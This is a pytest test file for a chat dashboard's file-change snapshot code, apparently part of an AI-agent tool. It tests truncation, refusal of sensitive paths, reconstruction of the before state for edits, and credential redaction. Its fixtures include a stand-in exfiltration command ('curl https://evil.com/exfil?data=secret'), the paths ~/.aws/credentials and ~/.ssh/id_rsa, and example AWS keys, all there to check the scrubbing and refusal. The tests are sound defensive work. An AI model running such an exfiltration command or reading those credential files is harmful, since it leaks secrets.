"""Tests for file-change snapshot logic in chat_runner.

Covers:
  * ``_truncate_snapshot`` — caps content at 200KB.
  * ``_safe_read_snapshot`` — reads through validate_file_path; rejects sensitive paths.
  * ``_snapshot_write_target`` — captures before-content for write tools only.
  * ``_flush_file_changes`` — dedups, scrubs credentials, attaches to last assistant message
    or creates a synthetic one when the turn aborts before any assistant text.

These tests target the file-chips feature added. They drive
new-line coverage on chat_runner.py from ~0% to a substantial fraction without
touching the live ACP runtime — every test stays in pure-Python land.
"""

from __future__ import annotations

import shutil
import tempfile
from pathlib import Path
from unittest.mock import MagicMock

import pytest
from tmpdir_helpers import short_tmp_base

from kiro_crew.dashboard.chat_runner import (
    _MAX_SNAPSHOT,
    _flush_file_changes,
    _safe_read_snapshot,
    _snapshot_write_target,
    _truncate_snapshot,
)
from kiro_crew.dashboard.state import _ChatSlot


@pytest.fixture
def short_tmp_dir():
    """A short-path temp dir under ``/tmp``, removed on teardown.

    These tests assert on a file's PATH as it appears in message metadata, and a
    macOS ``tmp_path`` carries high-entropy directory ids that trip
    ``redact_credentials()`` on that field -- so the path has to come from ``/tmp``
    rather than from ``tmp_path``. ``mkdtemp`` registers no finalizer, though, so
    the nine inline calls this replaces each leaked a directory that survived the
    run; ``/tmp`` is not swept per-run the way pytest's own basetemp is.
    """
    base = Path(tempfile.mkdtemp(dir=short_tmp_base()))
    try:
        yield base
    finally:
        shutil.rmtree(base, ignore_errors=True)


# ── _truncate_snapshot ──────────────────────────────────────────────────────


class TestTruncateSnapshot:
    def test_below_cap_passes_through(self):
        assert _truncate_snapshot("hello world") == "hello world"

    def test_empty_string_passes_through(self):
        assert _truncate_snapshot("") == ""

    def test_exactly_at_cap_not_truncated(self):
        content = "a" * _MAX_SNAPSHOT
        assert _truncate_snapshot(content) == content

    def test_above_cap_truncated_with_marker(self):
        content = "a" * (_MAX_SNAPSHOT + 100)
        out = _truncate_snapshot(content)
        # Original prefix preserved, marker appended.
        assert out.startswith("a" * _MAX_SNAPSHOT)
        assert "(truncated at" in out
        assert str(_MAX_SNAPSHOT) in out

    def test_truncation_idempotent_on_already_short_content(self):
        out = _truncate_snapshot("short")
        assert _truncate_snapshot(out) == "short"


# ── _safe_read_snapshot ─────────────────────────────────────────────────────


class TestSafeReadSnapshot:
    def test_reads_normal_file(self, tmp_path: Path):
        f = tmp_path / "file.txt"
        f.write_text("hello\nworld\n")
        assert _safe_read_snapshot(str(f)) == "hello\nworld\n"

    def test_returns_none_for_missing_file(self, tmp_path: Path):
        assert _safe_read_snapshot(str(tmp_path / "ghost")) is None

    def test_returns_none_for_directory(self, tmp_path: Path):
        # validate_file_path resolves to the directory, .is_file() == False.
        assert _safe_read_snapshot(str(tmp_path)) is None

    def test_returns_none_for_empty_path(self):
        # validate_file_path returns None for empty string.
        assert _safe_read_snapshot("") is None

    def test_returns_none_for_sensitive_path(self):
        # ~/.aws is on the sensitive-path list — should never be read for snapshot.
        assert _safe_read_snapshot("~/.aws/credentials") is None
        assert _safe_read_snapshot("~/.ssh/id_rsa") is None

    def test_truncates_large_file(self, tmp_path: Path):
        big = tmp_path / "big.txt"
        big.write_text("x" * (_MAX_SNAPSHOT + 50))
        out = _safe_read_snapshot(str(big))
        assert out is not None
        assert "(truncated at" in out

    def test_replaces_undecodable_bytes(self, tmp_path: Path):
        # errors="replace" is used so binary garbage doesn't crash the read.
        f = tmp_path / "binary.bin"
        f.write_bytes(b"hello\xff\xfeworld")
        out = _safe_read_snapshot(str(f))
        assert out is not None
        assert "hello" in out and "world" in out


# ── _snapshot_write_target ─────────────────────────────────────────────────


class TestSnapshotWriteTarget:
    def test_returns_none_for_non_dict_params(self):
        assert _snapshot_write_target(None) is None
        assert _snapshot_write_target("str") is None  # type: ignore[arg-type]
        assert _snapshot_write_target([]) is None  # type: ignore[arg-type]

    def test_returns_none_for_non_write_command(self, tmp_path: Path):
        f = tmp_path / "x.txt"
        f.write_text("body")
        assert _snapshot_write_target({"command": "Line", "path": str(f)}) is None
        assert _snapshot_write_target({"command": "", "path": str(f)}) is None

    def test_returns_none_for_empty_path(self):
        assert _snapshot_write_target({"command": "create", "path": ""}) is None

    def test_returns_none_for_sensitive_path(self):
        # validate_file_path rejects ~/.aws/credentials → no snapshot taken.
        assert (
            _snapshot_write_target({"command": "strReplace", "path": "~/.aws/credentials"}) is None
        )

    def test_create_on_new_file_returns_empty_content(self, tmp_path: Path):
        # File doesn't exist yet — chip should still surface with empty before.
        target = tmp_path / "new.txt"
        out = _snapshot_write_target({"command": "create", "path": str(target)})
        assert out == {"path": str(target), "content": ""}

    def test_str_replace_on_existing_file_captures_content(self, tmp_path: Path):
        f = tmp_path / "code.py"
        f.write_text("def hello():\n    pass\n")
        out = _snapshot_write_target({"command": "strReplace", "path": str(f)})
        assert out is not None
        assert out["path"] == str(f)
        assert out["content"] == "def hello():\n    pass\n"

    def test_insert_command_recognized_as_write(self, tmp_path: Path):
        f = tmp_path / "list.txt"
        f.write_text("a\nb\n")
        out = _snapshot_write_target({"command": "insert", "path": str(f)})
        assert out is not None
        assert out["content"] == "a\nb\n"


# ── _flush_file_changes ────────────────────────────────────────────────────


def _make_slot_with_assistant_message() -> _ChatSlot:
    """Build a _ChatSlot with one assistant message ready to receive file_changes."""
    slot = _ChatSlot("test-flush")
    slot.append("assistant", "done.", "msg msg-a", broadcast=False)
    return slot


class TestFlushFileChanges:
    def test_no_changes_is_noop(self):
        slot = _make_slot_with_assistant_message()
        _flush_file_changes(slot)
        # No meta added — message stays clean.
        assert "meta" not in slot.messages[-1] or "file_changes" not in slot.messages[-1].get(
            "meta", {}
        )

    def test_magicmock_attribute_does_not_fabricate_message(self):
        # A MagicMock-backed slot leaves _file_changes truthy but not a list.
        # Without the isinstance guard, _flush would synthesize a "stopped"
        # message every test invocation. This test pins that down.
        slot = MagicMock()
        slot.messages = []
        slot._file_changes = MagicMock()  # truthy but not a list
        _flush_file_changes(slot)
        # No synthetic message created.
        assert slot.messages == []

    def test_attaches_to_last_assistant_message(self, short_tmp_dir: Path):
        d = short_tmp_dir
        f = d / "x.py"
        f.write_text("after\n")
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [{"path": str(f), "content": "before\n"}]
        _flush_file_changes(slot)
        meta = slot.messages[-1]["meta"]
        assert "file_changes" in meta
        assert len(meta["file_changes"]) == 1
        assert meta["file_changes"][0]["path"] == str(f)
        assert meta["file_changes"][0]["before"] == "before\n"
        assert meta["file_changes"][0]["after"] == "after\n"
        # Slot's accumulator is reset for the next turn.
        assert slot._file_changes == []

    def test_dedup_keeps_first_before(self, short_tmp_dir: Path):
        d = short_tmp_dir
        f = d / "loop.py"
        f.write_text("v3\n")
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [
            {"path": str(f), "content": "v1\n"},
            {"path": str(f), "content": "v2\n"},
        ]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        assert len(changes) == 1
        # First "before" wins (truest pre-turn snapshot).
        assert changes[0]["before"] == "v1\n"
        # After-content is read from disk once.
        assert changes[0]["after"] == "v3\n"

    def test_dedup_across_multiple_files(self, short_tmp_dir: Path):
        d = short_tmp_dir
        a = d / "a.py"
        b = d / "b.py"
        a.write_text("a-after")
        b.write_text("b-after")
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [
            {"path": str(a), "content": "a-before"},
            {"path": str(b), "content": "b-before"},
            {"path": str(a), "content": "a-mid"},  # dedup'd
        ]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        assert len(changes) == 2
        paths = {c["path"] for c in changes}
        assert paths == {str(a), str(b)}

    def test_after_empty_when_file_deleted_during_turn(self, tmp_path: Path):
        slot = _make_slot_with_assistant_message()
        # Simulate: write tool ran, captured before, then the file was removed.
        ghost = tmp_path / "ghost.txt"
        slot._file_changes = [{"path": str(ghost), "content": "had-content\n"}]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        assert changes[0]["after"] == ""
        assert changes[0]["before"] == "had-content\n"

    def test_redacts_credentials_in_after_content(self, tmp_path: Path):
        f = tmp_path / "config.ini"
        f.write_text("aws_access_key_id=AKIAIOSFODNN7EXAMPLE\n")
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [{"path": str(f), "content": "(empty)"}]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        # AKIA key is scrubbed before reaching the UI.
        assert "AKIAIOSFODNN7EXAMPLE" not in changes[0]["after"]

    def test_redacts_credentials_in_before_content(self, tmp_path: Path):
        f = tmp_path / "post-edit.ini"
        f.write_text("clean\n")
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [
            {"path": str(f), "content": "aws_secret_access_key=AKIAIOSFODNN7EXAMPLE\n"}
        ]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        assert "AKIAIOSFODNN7EXAMPLE" not in changes[0]["before"]

    def test_synthetic_message_created_when_no_assistant_text(self, short_tmp_dir: Path):
        """User stopped before any assistant chunk: still surface modified files."""
        d = short_tmp_dir
        f = d / "edit.py"
        f.write_text("after\n")
        slot = _ChatSlot("aborted-turn")
        # No assistant message present — only a user message.
        slot.append("user", "hi", "msg msg-u", broadcast=False)
        slot._file_changes = [{"path": str(f), "content": "before\n"}]
        _flush_file_changes(slot)
        # New synthetic message appended at the end.
        last = slot.messages[-1]
        assert last["role"] == "assistant"
        assert "stopped" in last["content"].lower()
        assert last["meta"]["file_changes"][0]["path"] == str(f)


# ── Regression tests: real event ordering & content-block paths ────────────


class TestContentBlockBeforeText:
    """Regression tests that simulate the REAL event-processing ordering.

    In production, kiro-cli auto-approves the write and executes it
    immediately via a one-way notification — by the time the dashboard
    processes the tool_call event, the file on disk already has the NEW
    content. Without the race fix, _snapshot_write_target would read the
    disk and record before == after.

    These tests write the AFTER content to disk FIRST (simulating the race),
    then call _snapshot_write_target with the authoritative diff_old_text
    from the ACP content block, and assert that `before` reflects the
    content-block value (not the racy disk read).
    """

    def test_edit_uses_diff_old_text_despite_disk_having_new_content(self, tmp_path: Path):
        """Simulate: strReplace already executed on disk, event arrives with
        diff_old_text carrying the genuine pre-edit content."""
        f = tmp_path / "app.py"
        # Disk already has the AFTER content (write landed before event processing)
        f.write_text("def hello():\n    return 'new'\n")

        # The ACP content block tells us what was there BEFORE the write
        old_content = "def hello():\n    return 'old'\n"
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f)},
            diff_old_text=old_content,
            diff_path=str(f),
        )
        assert result is not None
        # CRITICAL: before must come from the content block, NOT the disk
        assert result["content"] == old_content
        assert result["path"] == str(f)

    def test_create_with_empty_diff_old_text_yields_empty_before(self, tmp_path: Path):
        """Simulate: create tool wrote a new file, event arrives with
        diff_old_text="" indicating file did not exist before."""
        f = tmp_path / "new_module.py"
        # Disk has the newly created content
        f.write_text("# brand new file\nclass Foo: pass\n")

        result = _snapshot_write_target(
            {"command": "create", "path": str(f)},
            diff_old_text="",  # empty string = created (no prior content)
            diff_path=str(f),
        )
        assert result is not None
        # Before must be empty for a create, regardless of what's on disk
        assert result["content"] == ""
        assert result["path"] == str(f)

    def test_create_with_none_diff_old_text_falls_back_to_disk(self, tmp_path: Path):
        """When diff_old_text is None (no content block present — e.g. the
        blocking permission-request path), fallback to disk read is correct
        because the write hasn't executed yet."""
        f = tmp_path / "existing.py"
        f.write_text("original content\n")

        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f)},
            diff_old_text=None,  # no content block → fallback
            diff_path="",
        )
        assert result is not None
        # Falls back to disk read (correct on the blocking path)
        assert result["content"] == "original content\n"

    def test_diff_path_used_when_params_path_empty(self, tmp_path: Path):
        """diff_path from the content block is used as fallback when
        raw_params has no 'path' key."""
        f = tmp_path / "target.py"
        f.write_text("after edit\n")

        result = _snapshot_write_target(
            {"command": "create", "path": ""},
            diff_old_text="before edit\n",
            diff_path=str(f),
        )
        assert result is not None
        assert result["path"] == str(f)
        assert result["content"] == "before edit\n"


class TestStrReplaceFullBeforeReconstruction:
    """The strReplace fragment-before bug (chips counting the whole file as
    additions).

    kiro-cli's diff content block ``oldText`` for strReplace is only the
    replaced FRAGMENT. The #920 race fix preferred it as the before-snapshot,
    so the chip diffed a fragment against the full-file after and rendered
    every line as an addition (observed live: a 1-line edit in a 12-line file
    showed +13 −1). The fix reconstructs the full before from the post-write
    disk content by reverse-applying the oldStr→newStr substitution.
    """

    BEFORE = "line 1\nline 2 OLD\nline 3\nline 4\n"
    AFTER = "line 1\nline 2 NEW\nline 3\nline 4\n"

    def test_post_write_reverse_substitution(self, tmp_path: Path):
        """Auto-approved path: disk already has AFTER; reconstruct BEFORE."""
        f = tmp_path / "app.py"
        f.write_text(self.AFTER)
        result = _snapshot_write_target(
            {
                "command": "strReplace",
                "path": str(f),
                "oldStr": "line 2 OLD",
                "newStr": "line 2 NEW",
            },
            diff_old_text="line 2 OLD",  # fragment, NOT the full file
            diff_path=str(f),
        )
        assert result is not None
        # Full-file before — not the one-line fragment.
        assert result["content"] == self.BEFORE

    def test_pre_write_disk_is_before(self, tmp_path: Path):
        """Blocking permission path: disk still has BEFORE; use it as-is."""
        f = tmp_path / "app.py"
        f.write_text(self.BEFORE)
        result = _snapshot_write_target(
            {
                "command": "strReplace",
                "path": str(f),
                "oldStr": "line 2 OLD",
                "newStr": "line 2 NEW",
            },
            diff_old_text="line 2 OLD",
            diff_path=str(f),
        )
        assert result is not None
        assert result["content"] == self.BEFORE

    def test_replace_all_declines_reconstruction(self, tmp_path: Path):
        """Server review finding: replaceAll doesn't enforce oldStr
        uniqueness, so reversing every newStr occurrence over-reverts any
        that pre-existed (NEW\\nOLD\\nOLD edited with replaceAll fabricated
        +3/−3 instead of +2/−2). Reconstruction declines; fragment chain
        applies."""
        f = tmp_path / "multi.txt"
        f.write_text("NEW\nmiddle\nNEW\n")
        result = _snapshot_write_target(
            {
                "command": "strReplace",
                "path": str(f),
                "oldStr": "OLD",
                "newStr": "NEW",
                "replaceAll": True,
            },
            diff_old_text="OLD",
            diff_path=str(f),
        )
        assert result is not None
        # Fell through to the fragment (diff_old_text) chain.
        assert result["content"] == "OLD"

    def test_old_str_substring_of_new_str_declines(self, tmp_path: Path):
        """Append-style edit, post-write: oldStr ⊂ newStr means the disk
        content is ALSO a valid pre-write state (oldStr occurs exactly once
        in it) — genuinely undecidable, so reconstruction declines rather
        than guessing post-write as the earlier branch order did."""
        f = tmp_path / "append.txt"
        f.write_text("head\nvalue = 1  # tuned\ntail\n")
        result = _snapshot_write_target(
            {
                "command": "strReplace",
                "path": str(f),
                "oldStr": "value = 1",
                "newStr": "value = 1  # tuned",
            },
            diff_old_text="value = 1",
            diff_path=str(f),
        )
        assert result is not None
        # Fell through to the fragment (diff_old_text) chain.
        assert result["content"] == "value = 1"

    def test_empty_new_str_deletion_falls_back_to_fragment(self, tmp_path: Path):
        """Deletion (newStr == ''): the removed text's position in the
        after-state is unrecoverable, so reconstruction declines and the
        pre-existing diff_old_text chain applies."""
        f = tmp_path / "del.txt"
        f.write_text("line 1\nline 3\n")
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "line 2\n", "newStr": ""},
            diff_old_text="line 2\n",
            diff_path=str(f),
        )
        assert result is not None
        assert result["content"] == "line 2\n"

    def test_ambiguous_new_str_declines_reconstruction(self, tmp_path: Path):
        """Full-scope review finding: post-write content with MULTIPLE newStr
        occurrences (newStr pre-existed elsewhere) makes the edit site
        ambiguous — reversing an arbitrary occurrence attributed the edit to
        the wrong line. Reconstruction declines; fragment chain applies."""
        f = tmp_path / "ambig.txt"
        f.write_text("NEW\nNEW\n")  # true before was "NEW\nOLD\n" — unknowable
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "OLD", "newStr": "NEW"},
            diff_old_text="OLD",
            diff_path=str(f),
        )
        assert result is not None
        # Fell through to the fragment (diff_old_text) chain.
        assert result["content"] == "OLD"

    def test_post_write_masquerading_as_pre_write_declines(self, tmp_path: Path):
        """Server review finding: strReplace("ab"→"a") on "aabb" yields "aab",
        which contains exactly one "ab" and so looks pre-write-plausible —
        but it IS the post-write state. Classifying it pre-write recorded
        the after as the before and erased the edit from the chip. With
        newStr present and non-unique, post-write cannot be excluded →
        decline."""
        f = tmp_path / "masquerade.txt"
        f.write_text("aab")  # after of strReplace("ab"→"a") on "aabb"
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "ab", "newStr": "a"},
            diff_old_text="ab",
            diff_path=str(f),
        )
        assert result is not None
        # Fell through to the fragment (diff_old_text) chain — NOT "aab".
        assert result["content"] == "ab"

    def test_seam_reformation_declines(self, tmp_path: Path):
        """Server review finding: oldStr can re-form across the replacement
        seam (oldStr='ab', newStr='a', before='abb' → after='ab'), making
        the disk content valid as BOTH states. Dual-hypothesis
        classification declines instead of misclassifying as pre-write."""
        f = tmp_path / "seam.txt"
        f.write_text("ab")  # after-state of the seam edit; also a valid before
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "ab", "newStr": "a"},
            diff_old_text="ab",
            diff_path=str(f),
        )
        assert result is not None
        # Fell through to the fragment (diff_old_text) chain.
        assert result["content"] == "ab"

    def test_special_file_declines(self):
        """Server review finding: /dev/zero stats as 0 bytes but reads
        unboundedly — the S_ISREG gate declines non-regular files before
        any read."""
        result = _snapshot_write_target(
            {"command": "strReplace", "path": "/dev/zero", "oldStr": "OLD", "newStr": "NEW"},
            diff_old_text="OLD",
            diff_path="/dev/zero",
        )
        assert result is not None
        assert result["content"] == "OLD"

    def test_post_read_size_recheck_declines(self, tmp_path: Path, monkeypatch):
        """The stat() gate races with an external writer growing the file;
        the post-read length re-check keeps the substring scans bounded."""
        import kiro_crew.dashboard.chat_runner as cr

        f = tmp_path / "grown.txt"
        f.write_text("NEW\n")  # passes the stat gate
        monkeypatch.setattr(
            cr, "safe_read_file", lambda _p: "x" * (cr._MAX_RECONSTRUCT_BYTES + 1) + "NEW"
        )
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "OLD", "newStr": "NEW"},
            diff_old_text="OLD",
            diff_path=str(f),
        )
        assert result is not None
        assert result["content"] == "OLD"

    def test_missing_file_falls_back_to_fragment(self, tmp_path: Path):
        """Unreadable/missing file: reconstruction declines, diff_old_text
        chain applies (never raises)."""
        ghost = tmp_path / "ghost.txt"
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(ghost), "oldStr": "a", "newStr": "b"},
            diff_old_text="a",
            diff_path=str(ghost),
        )
        assert result is not None
        assert result["content"] == "a"

    def test_reconstructed_before_is_truncated(self, tmp_path: Path):
        """Truncation applies AFTER reconstruction so the needle can't be cut
        mid-file, but the meta-size cap still holds."""
        f = tmp_path / "huge.txt"
        f.write_text("x" * (_MAX_SNAPSHOT + 500) + "NEW")
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "OLD", "newStr": "NEW"},
            diff_old_text="OLD",
            diff_path=str(f),
        )
        assert result is not None
        assert "(truncated at" in result["content"]
        assert len(result["content"]) < _MAX_SNAPSHOT + 500

    def test_pre_write_with_coincidental_new_str_is_before(self, tmp_path: Path):
        """Server review finding: pre-write file containing BOTH needles
        (newStr coincidentally pre-exists) must classify as before —
        reversing the unrelated newStr occurrence fabricated a changed line.
        oldStr present with oldStr ⊄ newStr PROVES pre-write (strReplace
        consumes every oldStr occurrence)."""
        f = tmp_path / "both.txt"
        f.write_text("NEW\nOLD\n")
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "OLD", "newStr": "NEW"},
            diff_old_text="OLD",
            diff_path=str(f),
        )
        assert result is not None
        # Disk content returned unchanged — NOT "OLD\nOLD\n".
        assert result["content"] == "NEW\nOLD\n"

    def test_pre_write_append_edit_uses_disk_as_before(self, tmp_path: Path):
        """oldStr ⊂ newStr shape, write not yet landed: third branch returns
        the disk content as the before."""
        f = tmp_path / "append-pre.txt"
        f.write_text("head\nvalue = 1\ntail\n")
        result = _snapshot_write_target(
            {
                "command": "strReplace",
                "path": str(f),
                "oldStr": "value = 1",
                "newStr": "value = 1  # tuned",
            },
            diff_old_text="value = 1",
            diff_path=str(f),
        )
        assert result is not None
        assert result["content"] == "head\nvalue = 1\ntail\n"

    def test_oversized_file_declines_reconstruction(self, tmp_path: Path, monkeypatch):
        """Server review finding: the synchronous reconstruction read runs on
        the event loop — files past _MAX_RECONSTRUCT_BYTES decline and fall
        through to the fragment chain instead of stalling the loop."""
        import kiro_crew.dashboard.chat_runner as cr

        f = tmp_path / "big.txt"
        f.write_text("payload NEW payload\n")
        monkeypatch.setattr(cr, "_MAX_RECONSTRUCT_BYTES", 4)
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "OLD", "newStr": "NEW"},
            diff_old_text="OLD",
            diff_path=str(f),
        )
        assert result is not None
        # Fell through to the fragment (diff_old_text) chain.
        assert result["content"] == "OLD"


class TestNoOpPassThrough:
    """No-op entries (before == after) are surfaced, not dropped.

    The dashboard renders an explicit "no changes" caption for them; a
    backend drop would compare post-truncation/post-redaction content and
    silently discard real changes past the snapshot limit or inside
    redacted spans (PR #920 review finding).
    """

    def test_noop_write_is_surfaced(self, short_tmp_dir: Path):
        """A write with identical before/after still generates an entry
        (the frontend labels it "no changes")."""
        d = short_tmp_dir
        f = d / "unchanged.py"
        f.write_text("same content\n")
        slot = _make_slot_with_assistant_message()
        # Before content (from content block) == after content (on disk)
        slot._file_changes = [{"path": str(f), "content": "same content\n"}]
        _flush_file_changes(slot)
        meta = slot.messages[-1].get("meta", {})
        assert "file_changes" in meta
        changes = meta["file_changes"]
        assert len(changes) == 1
        assert changes[0]["before"] == changes[0]["after"] == "same content\n"

    def test_noop_and_real_change_both_surfaced(self, short_tmp_dir: Path):
        """No-op and real-change entries both survive the flush."""
        d = short_tmp_dir
        changed = d / "changed.py"
        changed.write_text("new content\n")
        unchanged = d / "unchanged.py"
        unchanged.write_text("same\n")

        slot = _make_slot_with_assistant_message()
        slot._file_changes = [
            {"path": str(changed), "content": "old content\n"},
            {"path": str(unchanged), "content": "same\n"},  # no-op
        ]
        _flush_file_changes(slot)
        meta = slot.messages[-1].get("meta", {})
        assert "file_changes" in meta
        changes = {c["path"]: c for c in meta["file_changes"]}
        assert len(changes) == 2
        assert changes[str(changed)]["before"] == "old content\n"
        assert changes[str(changed)]["after"] == "new content\n"
        assert changes[str(unchanged)]["before"] == changes[str(unchanged)]["after"]

    def test_flush_always_resets_accumulator(self, short_tmp_dir: Path):
        """The accumulator is cleared on every flush path, so an all-no-op
        turn can never leak its entries into a later turn (stale-entry
        misattribution, PR #920 review finding)."""
        d = short_tmp_dir
        f = d / "a.py"
        f.write_text("content_a\n")

        slot = _make_slot_with_assistant_message()
        slot._file_changes = [{"path": str(f), "content": "content_a\n"}]
        _flush_file_changes(slot)
        assert slot._file_changes == []


class TestContentBlockRedactionAndTruncation:
    """Verify that content-block-sourced before text gets the same
    redaction and truncation treatment as disk-sourced text."""

    def test_truncation_applies_to_diff_old_text(self, tmp_path: Path):
        """Large content from a content block is capped at _MAX_SNAPSHOT."""
        f = tmp_path / "huge.py"
        f.write_text("short after\n")

        # Simulate a very large before-content from the content block
        huge_before = "x" * (_MAX_SNAPSHOT + 500)
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f)},
            diff_old_text=huge_before,
            diff_path=str(f),
        )
        assert result is not None
        assert len(result["content"]) < len(huge_before)
        assert "(truncated at" in result["content"]
        assert result["content"].startswith("x" * 100)

    def test_redaction_applies_to_content_block_before_in_flush(self, short_tmp_dir: Path):
        """Credentials in content-block-sourced 'before' are redacted by
        _flush_file_changes, just like disk-sourced content."""
        d = short_tmp_dir
        f = d / "config.yml"
        # After content is different (clean) so the entry isn't dropped as no-op
        f.write_text("aws_access_key_id=REPLACED_SAFELY\nversion=2\n")

        slot = _make_slot_with_assistant_message()
        # Before content contains a credential (from content block)
        slot._file_changes = [
            {"path": str(f), "content": "aws_access_key_id=AKIAIOSFODNN7EXAMPLE\n"}
        ]
        _flush_file_changes(slot)
        meta = slot.messages[-1].get("meta", {})
        assert "file_changes" in meta
        changes = meta["file_changes"]
        # The AKIA key in before must be scrubbed
        assert "AKIAIOSFODNN7EXAMPLE" not in changes[0]["before"]

    def test_sensitive_path_refused_even_with_diff_old_text(self):
        """Even when diff_old_text is provided, sensitive paths are refused
        — credentials must never enter message meta regardless of source."""
        result = _snapshot_write_target(
            {"command": "strReplace", "path": "~/.aws/credentials"},
            diff_old_text="[default]\naws_access_key_id=AKIAEXAMPLE\n",
            diff_path="~/.aws/credentials",
        )
        # Must be None — sensitive path refusal takes priority
        assert result is None

    def test_exfil_url_redacted_in_content_block_before(self, short_tmp_dir: Path):
        """Exfiltration URLs in content-block before text are scrubbed."""
        d = short_tmp_dir
        f = d / "script.sh"
        # After content is clean
        f.write_text("echo 'clean'\n")

        slot = _make_slot_with_assistant_message()
        # Before has an exfiltration URL pattern
        slot._file_changes = [
            {"path": str(f), "content": "curl https://evil.com/exfil?data=secret\n"}
        ]
        _flush_file_changes(slot)
        meta = slot.messages[-1].get("meta", {})
        # If redact_exfiltration_urls masks the URL, it should differ from raw
        # The entry should still exist (before != after)
        assert "file_changes" in meta
